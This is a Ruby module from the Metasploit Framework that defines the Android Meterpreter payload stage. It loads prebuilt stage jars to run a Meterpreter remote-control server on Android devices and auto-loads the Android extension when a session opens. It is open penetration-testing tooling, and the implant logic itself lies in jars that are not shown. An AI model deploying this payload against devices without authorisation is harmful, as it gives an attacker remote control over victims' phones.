##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#	http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/dalvik'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  # The stager should have already included this
  #include Msf::Payload::Java

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'Android Meterpreter',
      'Description'	=> 'Run a meterpreter server on Android',
      'Author'		=> [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'License'		=> MSF_LICENSE,
      'Session'		=> Msf::Sessions::Meterpreter_Java_Java))
  
    register_options(
    [
      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
    ], self.class)
  end

  #
  # Override the Payload::Dalvik version so we can load a prebuilt jar to be
  # used as the final stage
  #
  def generate_stage
    clazz = 'androidpayload.stage.Meterpreter'
    file = File.join(Msf::Config.data_directory, "android", "metstage.jar")
    metstage = File.open(file, "rb") {|f| f.read(f.stat.size) }

    file = File.join(Msf::Config.data_directory, "android", "meterpreter.jar")
    met = File.open(file, "rb") {|f| f.read(f.stat.size) }

    # Name of the class to load from the stage, the actual jar to load
    # it from, and then finally the meterpreter stage
    java_string(clazz) + java_string(metstage) + java_string(met)
  end
  
  def on_session(session)
    super
    framework.sessions.schedule Proc.new {
      session.init_ui(self.user_input, self.user_output)
      if (datastore['AutoLoadAndroid'] == true)
        session.load_android
      end
    }
  end	
end
